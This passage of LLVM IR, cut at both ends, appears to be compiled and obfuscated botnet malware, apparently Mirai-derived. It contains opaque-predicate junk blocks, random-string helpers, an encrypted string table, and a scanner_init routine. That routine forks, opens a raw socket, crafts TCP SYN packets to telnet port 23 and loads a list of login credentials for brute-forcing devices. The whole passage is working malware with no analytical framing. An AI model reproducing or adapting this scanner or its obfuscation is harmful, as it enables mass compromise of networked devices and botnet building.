  %116 = add i32 %115, %114
  store i32 %116, i32* %20, align 4
  %117 = load i32, i32* @x.45
  %118 = load i32, i32* @y.46
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart288, label %originalBB14alteredBB

originalBBpart288:                                ; preds = %originalBB14
  br label %125

; <label>:125:                                    ; preds = %129, %originalBBpart288
  %126 = load i32, i32* %20, align 4
  %127 = lshr i32 %126, 16
  %128 = icmp ne i32 %127, 0
  br i1 %128, label %129, label %135

; <label>:129:                                    ; preds = %125
  %130 = load i32, i32* %20, align 4
  %131 = and i32 %130, 65535
  %132 = load i32, i32* %20, align 4
  %133 = lshr i32 %132, 16
  %134 = add i32 %131, %133
  store i32 %134, i32* %20, align 4
  br label %125

; <label>:135:                                    ; preds = %125
  %136 = load i32, i32* @x.45
  %137 = load i32, i32* @y.46
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %135
  %144 = load i32, i32* %20, align 4
  %145 = xor i32 %144, -1
  %146 = trunc i32 %145 to i16
  %147 = load i32, i32* @x.45
  %148 = load i32, i32* @y.46
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart2102, label %originalBB90alteredBB

originalBBpart2102:                               ; preds = %originalBB90
  ret i16 %146

originalBBalteredBB:                              ; preds = %originalBB, %4
  %155 = alloca %struct.iphdr*, align 8
  %156 = alloca i8*, align 8
  %157 = alloca i16, align 2
  %158 = alloca i32, align 4
  %159 = alloca i16*, align 8
  %160 = alloca i32, align 4
  %161 = alloca i32, align 4
  %162 = alloca i32, align 4
  %163 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %155, align 8
  store i8* %1, i8** %156, align 8
  store i16 %2, i16* %157, align 2
  store i32 %3, i32* %158, align 4
  %164 = load i8*, i8** %156, align 8
  %165 = bitcast i8* %164 to i16*
  store i16* %165, i16** %159, align 8
  %166 = load %struct.iphdr*, %struct.iphdr** %155, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 8
  %168 = load i32, i32* %167, align 4
  store i32 %168, i32* %160, align 4
  %169 = load %struct.iphdr*, %struct.iphdr** %155, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 9
  %171 = load i32, i32* %170, align 4
  store i32 %171, i32* %161, align 4
  store i32 0, i32* %162, align 4
  %172 = load i32, i32* %158, align 4
  store i32 %172, i32* %163, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %42
  %173 = load i16*, i16** %17, align 8
  %174 = load i16, i16* %173, align 2
  %175 = zext i16 %174 to i32
  %176 = load i32, i32* %20, align 4
  %_ = sub i32 %176, %175
  %gen = mul i32 %_, %175
  %_2 = shl i32 %176, %175
  %_3 = sub i32 %176, %175
  %gen4 = mul i32 %_3, %175
  %_5 = sub i32 0, %176
  %gen6 = add i32 %_5, %175
  %177 = add i32 %176, %175
  store i32 %177, i32* %20, align 4
  %178 = load i16*, i16** %17, align 8
  %179 = getelementptr inbounds i16, i16* %178, i32 1
  store i16* %179, i16** %17, align 8
  %180 = load i32, i32* %16, align 4
  %_7 = sub i32 0, %180
  %gen8 = add i32 %_7, 2
  %_9 = sub i32 0, %180
  %gen10 = add i32 %_9, 2
  %181 = sub nsw i32 %180, 2
  store i32 %181, i32* %16, align 4
  br label %originalBB1

originalBB14alteredBB:                            ; preds = %originalBB14, %78
  %182 = load i32, i32* %18, align 4
  %_15 = shl i32 %182, 16
  %183 = lshr i32 %182, 16
  %_16 = shl i32 %183, 65535
  %_17 = shl i32 %183, 65535
  %_18 = shl i32 %183, 65535
  %_19 = sub i32 0, %183
  %gen20 = add i32 %_19, 65535
  %_21 = shl i32 %183, 65535
  %_22 = shl i32 %183, 65535
  %_23 = shl i32 %183, 65535
  %184 = and i32 %183, 65535
  %185 = load i32, i32* %20, align 4
  %_24 = shl i32 %185, %184
  %_25 = sub i32 0, %185
  %gen26 = add i32 %_25, %184
  %_27 = sub i32 %185, %184
  %gen28 = mul i32 %_27, %184
  %_29 = sub i32 0, %185
  %gen30 = add i32 %_29, %184
  %_31 = sub i32 0, %185
  %gen32 = add i32 %_31, %184
  %_33 = sub i32 0, %185
  %gen34 = add i32 %_33, %184
  %186 = add i32 %185, %184
  store i32 %186, i32* %20, align 4
  %187 = load i32, i32* %18, align 4
  %_35 = sub i32 %187, 65535
  %gen36 = mul i32 %_35, 65535
  %_37 = sub i32 %187, 65535
  %gen38 = mul i32 %_37, 65535
  %_39 = sub i32 %187, 65535
  %gen40 = mul i32 %_39, 65535
  %_41 = shl i32 %187, 65535
  %_42 = sub i32 %187, 65535
  %gen43 = mul i32 %_42, 65535
  %188 = and i32 %187, 65535
  %189 = load i32, i32* %20, align 4
  %_44 = sub i32 %189, %188
  %gen45 = mul i32 %_44, %188
  %190 = add i32 %189, %188
  store i32 %190, i32* %20, align 4
  %191 = load i32, i32* %19, align 4
  %_46 = sub i32 0, %191
  %gen47 = add i32 %_46, 16
  %_48 = shl i32 %191, 16
  %_49 = sub i32 0, %191
  %gen50 = add i32 %_49, 16
  %_51 = sub i32 %191, 16
  %gen52 = mul i32 %_51, 16
  %_53 = shl i32 %191, 16
  %_54 = sub i32 %191, 16
  %gen55 = mul i32 %_54, 16
  %192 = lshr i32 %191, 16
  %_56 = sub i32 %192, 65535
  %gen57 = mul i32 %_56, 65535
  %_58 = sub i32 0, %192
  %gen59 = add i32 %_58, 65535
  %_60 = sub i32 %192, 65535
  %gen61 = mul i32 %_60, 65535
  %_62 = shl i32 %192, 65535
  %_63 = sub i32 %192, 65535
  %gen64 = mul i32 %_63, 65535
  %193 = and i32 %192, 65535
  %194 = load i32, i32* %20, align 4
  %_65 = shl i32 %194, %193
  %_66 = shl i32 %194, %193
  %_67 = sub i32 0, %194
  %gen68 = add i32 %_67, %193
  %_69 = sub i32 %194, %193
  %gen70 = mul i32 %_69, %193
  %195 = add i32 %194, %193
  store i32 %195, i32* %20, align 4
  %196 = load i32, i32* %19, align 4
  %_71 = sub i32 0, %196
  %gen72 = add i32 %_71, 65535
  %_73 = sub i32 %196, 65535
  %gen74 = mul i32 %_73, 65535
  %197 = and i32 %196, 65535
  %198 = load i32, i32* %20, align 4
  %_75 = shl i32 %198, %197
  %_76 = sub i32 %198, %197
  %gen77 = mul i32 %_76, %197
  %199 = add i32 %198, %197
  store i32 %199, i32* %20, align 4
  %200 = load %struct.iphdr*, %struct.iphdr** %13, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 6
  %202 = load i8, i8* %201, align 1
  %203 = zext i8 %202 to i16
  %204 = call zeroext i16 @htons(i16 zeroext %203) #7
  %205 = zext i16 %204 to i32
  %206 = load i32, i32* %20, align 4
  %_78 = sub i32 %206, %205
  %gen79 = mul i32 %_78, %205
  %207 = add i32 %206, %205
  store i32 %207, i32* %20, align 4
  %208 = load i16, i16* %15, align 2
  %209 = zext i16 %208 to i32
  %210 = load i32, i32* %20, align 4
  %_80 = shl i32 %210, %209
  %_81 = shl i32 %210, %209
  %_82 = shl i32 %210, %209
  %_83 = sub i32 %210, %209
  %gen84 = mul i32 %_83, %209
  %_85 = sub i32 %210, %209
  %gen86 = mul i32 %_85, %209
  %211 = add i32 %210, %209
  store i32 %211, i32* %20, align 4
  br label %originalBB14

originalBB90alteredBB:                            ; preds = %originalBB90, %135
  %212 = load i32, i32* %20, align 4
  %_91 = shl i32 %212, -1
  %_92 = sub i32 %212, -1
  %gen93 = mul i32 %_92, -1
  %_94 = shl i32 %212, -1
  %_95 = sub i32 0, %212
  %gen96 = add i32 %_95, -1
  %_97 = sub i32 0, %212
  %gen98 = add i32 %_97, -1
  %_99 = sub i32 %212, -1
  %gen100 = mul i32 %_99, -1
  %213 = xor i32 %212, -1
  %214 = trunc i32 %213 to i16
  br label %originalBB90
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %5

; <label>:5:                                      ; preds = %61, %2
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %8, label %62

; <label>:8:                                      ; preds = %5
  %9 = load i32, i32* %4, align 4
  %10 = icmp sge i32 %9, 4
  br i1 %10, label %11, label %21

; <label>:11:                                     ; preds = %8
  %12 = call i32 @rand_next()
  %13 = load i8*, i8** %3, align 8
  %14 = bitcast i8* %13 to i32*
  store i32 %12, i32* %14, align 4
  %15 = load i8*, i8** %3, align 8
  %16 = getelementptr inbounds i8, i8* %15, i64 4
  store i8* %16, i8** %3, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sext i32 %17 to i64
  %19 = sub i64 %18, 4
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* %4, align 4
  br label %61

; <label>:21:                                     ; preds = %8
  %22 = load i32, i32* %4, align 4
  %23 = icmp sge i32 %22, 2
  br i1 %23, label %24, label %52

; <label>:24:                                     ; preds = %21
  %25 = load i32, i32* @x.49
  %26 = load i32, i32* @y.50
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  %33 = call i32 @rand_next()
  %34 = and i32 %33, 65535
  %35 = trunc i32 %34 to i16
  %36 = load i8*, i8** %3, align 8
  %37 = bitcast i8* %36 to i16*
  store i16 %35, i16* %37, align 2
  %38 = load i8*, i8** %3, align 8
  %39 = getelementptr inbounds i8, i8* %38, i64 2
  store i8* %39, i8** %3, align 8
  %40 = load i32, i32* %4, align 4
  %41 = sext i32 %40 to i64
  %42 = sub i64 %41, 2
  %43 = trunc i64 %42 to i32
  store i32 %43, i32* %4, align 4
  %44 = load i32, i32* @x.49
  %45 = load i32, i32* @y.50
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %60

; <label>:52:                                     ; preds = %21
  %53 = call i32 @rand_next()
  %54 = and i32 %53, 255
  %55 = trunc i32 %54 to i8
  %56 = load i8*, i8** %3, align 8
  %57 = getelementptr inbounds i8, i8* %56, i32 1
  store i8* %57, i8** %3, align 8
  store i8 %55, i8* %56, align 1
  %58 = load i32, i32* %4, align 4
  %59 = add nsw i32 %58, -1
  store i32 %59, i32* %4, align 4
  br label %60

; <label>:60:                                     ; preds = %52, %originalBBpart2
  br label %61

; <label>:61:                                     ; preds = %60, %11
  br label %5

; <label>:62:                                     ; preds = %5
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %24
  %63 = call i32 @rand_next()
  %_ = sub i32 %63, 65535
  %gen = mul i32 %_, 65535
  %_1 = sub i32 %63, 65535
  %gen2 = mul i32 %_1, 65535
  %64 = and i32 %63, 65535
  %65 = trunc i32 %64 to i16
  %66 = load i8*, i8** %3, align 8
  %67 = bitcast i8* %66 to i16*
  store i16 %65, i16* %67, align 2
  %68 = load i8*, i8** %3, align 8
  %69 = getelementptr inbounds i8, i8* %68, i64 2
  store i8* %69, i8** %3, align 8
  %70 = load i32, i32* %4, align 4
  %71 = sext i32 %70 to i64
  %_3 = sub i64 0, %71
  %gen4 = add i64 %_3, 2
  %72 = sub i64 %71, 2
  %73 = trunc i64 %72 to i32
  store i32 %73, i32* %4, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alpha_str(i8*, i32) #0 {
  %3 = load i32, i32* @x.51
  %4 = load i32, i32* @y.52
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca [32 x i8], align 16
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  call void @table_unlock_val(i8 zeroext 28)
  %14 = getelementptr inbounds [32 x i8], [32 x i8]* %13, i32 0, i32 0
  %15 = call i8* @table_retrieve_val(i32 28, i32* null)
  %16 = call i8* @strcpy(i8* %14, i8* %15) #6
  %17 = load i32, i32* @x.51
  %18 = load i32, i32* @y.52
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %29, %originalBBpart2
  %26 = load i32, i32* %12, align 4
  %27 = add nsw i32 %26, -1
  store i32 %27, i32* %12, align 4
  %28 = icmp ne i32 %26, 0
  br i1 %28, label %29, label %39

; <label>:29:                                     ; preds = %25
  %30 = call i32 @rand_next()
  %31 = getelementptr inbounds [32 x i8], [32 x i8]* %13, i32 0, i32 0
  %32 = call i32 @util_strlen(i8* %31)
  %33 = urem i32 %30, %32
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds [32 x i8], [32 x i8]* %13, i64 0, i64 %34
  %36 = load i8, i8* %35, align 1
  %37 = load i8*, i8** %11, align 8
  %38 = getelementptr inbounds i8, i8* %37, i32 1
  store i8* %38, i8** %11, align 8
  store i8 %36, i8* %37, align 1
  br label %25

; <label>:39:                                     ; preds = %25
  call void @table_lock_val(i8 zeroext 28)
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca [32 x i8], align 16
  store i8* %0, i8** %40, align 8
  store i32 %1, i32* %41, align 4
  call void @table_unlock_val(i8 zeroext 28)
  %43 = getelementptr inbounds [32 x i8], [32 x i8]* %42, i32 0, i32 0
  %44 = call i8* @table_retrieve_val(i32 28, i32* null)
  %45 = call i8* @strcpy(i8* %43, i8* %44) #6
  br label %originalBB
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @scanner_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.fd_set.18, align 8
  %6 = alloca %struct.fd_set.18, align 8
  %7 = alloca %struct.scanner_connection*, align 8
  %8 = alloca %struct.timeval.19, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.tcphdr*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.tcphdr*, align 8
  %22 = alloca %struct.scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i8*, align 8
  %43 = alloca i32, align 4
  %44 = alloca i8*, align 8
  %45 = alloca i32, align 4
  %46 = call i32 @fork() #6
  store i32 %46, i32* @scanner_pid, align 4
  %47 = load i32, i32* @scanner_pid, align 4
  %48 = icmp sgt i32 %47, 0
  br i1 %48, label %52, label %49

; <label>:49:                                     ; preds = %0
  %50 = load i32, i32* @scanner_pid, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %49, %0
  ret void

; <label>:53:                                     ; preds = %49
  %54 = call i32 @util_local_addr()
  store i32 %54, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %55 = call i64 @time(i64* null) #6
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* @fake_time, align 4
  %57 = call noalias i8* @calloc(i64 256, i64 296) #6
  %58 = bitcast i8* %57 to %struct.scanner_connection*
  store %struct.scanner_connection* %58, %struct.scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  br label %59

; <label>:59:                                     ; preds = %89, %53
  %60 = load i32, i32* @x.53
  %61 = load i32, i32* @y.54
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %59
  %68 = load i32, i32* %1, align 4
  %69 = icmp slt i32 %68, 256
  %70 = load i32, i32* @x.53
  %71 = load i32, i32* @y.54
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %69, label %78, label %92

; <label>:78:                                     ; preds = %originalBBpart2
  %79 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %80 = load i32, i32* %1, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %79, i64 %81
  %83 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %82, i32 0, i32 3
  store i32 0, i32* %83, align 8
  %84 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %85 = load i32, i32* %1, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %84, i64 %86
  %88 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %87, i32 0, i32 1
  store i32 -1, i32* %88, align 8
  br label %89

; <label>:89:                                     ; preds = %78
  %90 = load i32, i32* %1, align 4
  %91 = add nsw i32 %90, 1
  store i32 %91, i32* %1, align 4
  br label %59

; <label>:92:                                     ; preds = %originalBBpart2
  %93 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %93, i32* @rsck, align 4
  %94 = icmp eq i32 %93, -1
  br i1 %94, label %95, label %96

; <label>:95:                                     ; preds = %92
  br label %96

; <label>:96:                                     ; preds = %95, %92
  %97 = load i32, i32* @rsck, align 4
  %98 = load i32, i32* @rsck, align 4
  %99 = call i32 (i32, i32, ...) @fcntl(i32 %98, i32 3, i32 0)
  %100 = or i32 2048, %99
  %101 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 4, i32 %100)
  store i32 1, i32* %1, align 4
  %102 = load i32, i32* @rsck, align 4
  %103 = bitcast i32* %1 to i8*
  %104 = call i32 @setsockopt(i32 %102, i32 0, i32 3, i8* %103, i32 4) #6
  %105 = icmp ne i32 %104, 0
  br i1 %105, label %106, label %125

; <label>:106:                                    ; preds = %96
  %107 = load i32, i32* @x.53
  %108 = load i32, i32* @y.54
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %106
  %115 = load i32, i32* @rsck, align 4
  %116 = call i32 @close(i32 %115)
  %117 = load i32, i32* @x.53
  %118 = load i32, i32* @y.54
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %125

; <label>:125:                                    ; preds = %originalBBpart24, %96
  %126 = load i32, i32* @x.53
  %127 = load i32, i32* @y.54
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %125
  %134 = load i32, i32* @x.53
  %135 = load i32, i32* @y.54
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %142

; <label>:142:                                    ; preds = %originalBBpart212, %originalBBpart28
  %143 = call i32 @rand_next()
  %144 = and i32 %143, 65535
  %145 = trunc i32 %144 to i16
  store i16 %145, i16* %2, align 2
  br label %146

; <label>:146:                                    ; preds = %142
  %147 = load i32, i32* @x.53
  %148 = load i32, i32* @y.54
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %146
  %155 = load i16, i16* %2, align 2
  %156 = call zeroext i16 @ntohs(i16 zeroext %155) #7
  %157 = zext i16 %156 to i32
  %158 = icmp slt i32 %157, 1024
  %159 = load i32, i32* @x.53
  %160 = load i32, i32* @y.54
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %158, label %142, label %167

; <label>:167:                                    ; preds = %originalBBpart212
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %168 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i64 1
  %170 = bitcast %struct.iphdr* %169 to %struct.tcphdr*
  store %struct.tcphdr* %170, %struct.tcphdr** %4, align 8
  %171 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %172 = bitcast %struct.iphdr* %171 to i8*
  %173 = load i8, i8* %172, align 4
  %174 = and i8 %173, -16
  %175 = or i8 %174, 5
  store i8 %175, i8* %172, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %177 = bitcast %struct.iphdr* %176 to i8*
  %178 = load i8, i8* %177, align 4
  %179 = and i8 %178, 15
  %180 = or i8 %179, 64
  store i8 %180, i8* %177, align 4
  %181 = call zeroext i16 @htons(i16 zeroext 40) #7
  %182 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 2
  store i16 %181, i16* %183, align 2
  %184 = call i32 @rand_next()
  %185 = trunc i32 %184 to i16
  %186 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 3
  store i16 %185, i16* %187, align 4
  %188 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 5
  store i8 64, i8* %189, align 4
  %190 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 6
  store i8 6, i8* %191, align 1
  %192 = call zeroext i16 @htons(i16 zeroext 23) #7
  %193 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %194 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %193, i32 0, i32 1
  store i16 %192, i16* %194, align 2
  %195 = load i16, i16* %2, align 2
  %196 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 0
  store i16 %195, i16* %197, align 4
  %198 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 4
  %200 = load i16, i16* %199, align 4
  %201 = and i16 %200, -241
  %202 = or i16 %201, 80
  store i16 %202, i16* %199, align 4
  %203 = call i32 @rand_next()
  %204 = and i32 %203, 65535
  %205 = trunc i32 %204 to i16
  %206 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %207 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %206, i32 0, i32 5
  store i16 %205, i16* %207, align 2
  %208 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 4
  %210 = load i16, i16* %209, align 4
  %211 = and i16 %210, -513
  %212 = or i16 %211, 512
  store i16 %212, i16* %209, align 4
  call void @add_auth_entry(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 6)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i32 0, i32 0), i16 zeroext 14)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.8, i32 0, i32 0), i16 zeroext 17)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i32 0, i32 0), i16 zeroext 14)
  call void @add_auth_entry(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0), i16 zeroext 11)
